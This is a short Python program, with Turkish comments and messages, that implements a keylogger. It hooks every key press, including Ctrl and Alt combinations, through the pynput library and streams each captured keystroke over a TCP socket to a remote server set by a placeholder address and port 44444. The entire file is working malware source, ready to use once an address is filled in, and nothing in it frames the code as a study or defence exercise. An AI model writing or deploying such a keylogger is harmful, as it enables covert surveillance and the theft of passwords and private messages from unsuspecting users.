import socket
import sys
from pynput import keyboard

class Connection:
    def __init__(self, host: str, port: int) -> None:
        try:
            self.sock = socket.create_connection((host, port))
        except socket.error as e:
            print(f"Bağlantı hatası: {e}")
            sys.exit(1)

    def send(self, data: str) -> None:
        self.sock.send(data.encode())

    def close(self) -> None:
        self.sock.close()

def on_key_press(key) -> None:
    global ctrl_state, alt_state
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_state = True
        return
    elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
        alt_state = True
    if hasattr(key, "char"):
        if not hasattr(key, "vk"):
            return
        elif ctrl_state or alt_state:
            pressed = f"[{'CTRL+' if ctrl_state else ''}{'ALT+' if alt_state else ''}{chr(key.vk)}]"
        else:
            pressed = key.char
        print(f"Pressed: {pressed}")  # Eklediğimiz satır
    else:
        pressed = KEY_MAP.get(
            key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])
        ).upper()
        print(f"Pressed: {pressed}")  # Eklediğimiz satır
    connection.send(pressed)

def on_key_release(key) -> None:
    global ctrl_state, alt_state
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_state = False
    elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
        alt_state = False

if __name__ == "__main__":
    try:
        SERVER_ADDRESS = "your_IP"
        SERVER_PORT = 44444
        KEY_MAP = {"enter": "\n", "space": " ", "tab": "\t"}

        ctrl_state, alt_state = False, False

        connection = Connection(SERVER_ADDRESS, SERVER_PORT)
        
        with keyboard.Listener(
            on_press=on_key_press, on_release=on_key_release
        ) as listener:
            listener.join()

    except KeyboardInterrupt:
        print("Program kapatıldı.")
    except Exception as e:
        print(f"Bir hata oluştu: {e}")
    finally:
        connection.close()
